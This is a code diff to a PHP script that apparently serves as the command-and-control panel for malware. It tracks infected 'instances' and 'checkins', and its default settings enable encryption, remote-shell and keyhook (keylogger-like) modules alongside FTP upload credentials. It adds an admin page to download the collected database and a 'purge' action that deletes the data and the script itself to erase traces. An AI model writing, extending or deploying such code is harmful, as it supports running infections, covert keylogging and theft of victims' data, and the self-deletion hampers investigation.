@@ -14,7 +14,7 @@
  *   server running PHP 5+ with PDO and SQLite 2+. Then call
  *   this script with the <script.php>?setup=true parameter.
  *
- * VERSION: 0.9
+ * VERSION: 1.0
  */
 
 /* Global config settings */
@@ -55,6 +55,22 @@ function logError($message) {
 	if (DEBUG) {
 		die("<b><font color=\"red\">[Error] </font>" . $message . "</b><br />");
 	}
+}
+
+function deleteDirectory($path) {
+	if (is_dir($path) === true) {
+		$files = array_diff(scandir($path), array('.', '..'));
+
+		foreach ($files as $file) {
+			deleteDirectory(realpath($path) . '/' . $file);
+		}
+
+		return rmdir($path);
+	} else if (is_file($path) === true) {
+		return unlink($path);
+	}
+
+	return false;
 }
 
 function randomPassword($length = 14) {
@@ -120,6 +136,14 @@ function setup() {
 		}
 
 		logOke("Creating directories");
+
+		$htaccess  = "Options -Indexes\n";
+        $htaccess .= "Deny from all\n";
+        $htaccess .= "Require all denied\n";
+
+		file_put_contents(TMP_DIR . "/.htaccess", $htaccess);
+
+		logOke("Creating server settings");
 	} else {
 		logError("Setup already present");
 	}
@@ -181,6 +205,10 @@ function setup() {
 		$db->exec("INSERT INTO settings (key, value) VALUES ('ftp_host', 'ftp://example.org')");
 		$db->exec("INSERT INTO settings (key, value) VALUES ('ftp_username', '')");
 		$db->exec("INSERT INTO settings (key, value) VALUES ('ftp_password', '')");
+		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_encrypt', 'true')");
+		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_shell', 'true')");
+		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_keyhook', 'true')");
+		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_compile', 'false')");
 
 		$db = NULL;
 		logOke("Create default settings");
@@ -347,6 +375,48 @@ function updateLocation() {
 	}
 }
 
+function countInstances() {
+	try {
+		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
+		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+		$sql = "SELECT count('*') FROM instances";
+
+		$stmt = $db->prepare($sql);
+		$stmt->execute();
+		
+		if ($row = $stmt->fetch()) {
+			$db = NULL;
+			return $row[0];
+		}
+
+		$db = NULL;
+	} catch(PDOException $e) {
+		logError("Getting instance count: " . $e->getMessage());
+	}
+}
+
+function countCheckins() {
+	try {
+		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
+		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+		$sql = "SELECT count('*') FROM checkin";
+
+		$stmt = $db->prepare($sql);
+		$stmt->execute();
+		
+		if ($row = $stmt->fetch()) {
+			$db = NULL;
+			return $row[0];
+		}
+
+		$db = NULL;
+	} catch(PDOException $e) {
+		logError("Getting checkin count: " . $e->getMessage());
+	}
+}
+
 function handleSolicit(stdClass $data) {
 	if (!property_exists($data, 'guid')) {
 		sendResponseError();
@@ -505,12 +575,31 @@ function handleAdminRequest() {
 		login();
 	} else {
 		if (authenticateUser($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW'])) {
-			echo "<p>Welcome: " . htmlspecialchars($_SERVER['PHP_AUTH_USER']) . "<br />";
-			echo "<form action='' method='post'>\n";
-			echo "<input type='hidden' name='SeenBefore' value='1' />\n";
-			echo "<input type='hidden' name='OldAuth' value=\"" . htmlspecialchars($_SERVER['PHP_AUTH_USER']) . "\" />\n";
-			echo "<input type='submit' value='Re Authenticate' />\n";
-			echo "</form></p>\n";
+
+			if (isset($_GET['downloaddb']) && $_GET['downloaddb'] == "true") {
+				header('Content-Description: File Transfer');
+				header('Content-Type: application/octet-stream');
+				header('Content-Disposition: attachment; filename="'.basename(SQL_DB).'"');
+				header('Expires: 0');
+				header('Cache-Control: must-revalidate');
+				header('Pragma: public');
+				header('Content-Length: ' . filesize(TMP_DIR . "/" . SQL_DB));
+				readfile(TMP_DIR . "/" . SQL_DB);
+				exit();
+			}
+
+			if (isset($_GET['purge']) && $_GET['purge'] == "true") {
+				deleteDirectory(TMP_DIR);
+				unlink(basename(__FILE__));
+				logOke("Endpoint and data purged");
+				exit();
+			}
+
+			logOke("Login: " . htmlspecialchars($_SERVER['PHP_AUTH_USER']));
+			logOke("Instances: " . countInstances());
+			logOke("Checkins: " . countCheckins());
+			echo "<br /><br />Download database:<br /><button onclick=\"window.open('?admin=true&downloaddb=true');\">Download database</button>\n";
+			echo "<br /><br />Purge AVC endpoint:<br /><button onclick=\"if (confirm('Purge this endpoint including data?')){ window.location.href = '?admin=true&purge=true'; }else{ false; }\">Eliminate endpoint</button>\n";
 		} else {
 			login();
 		}
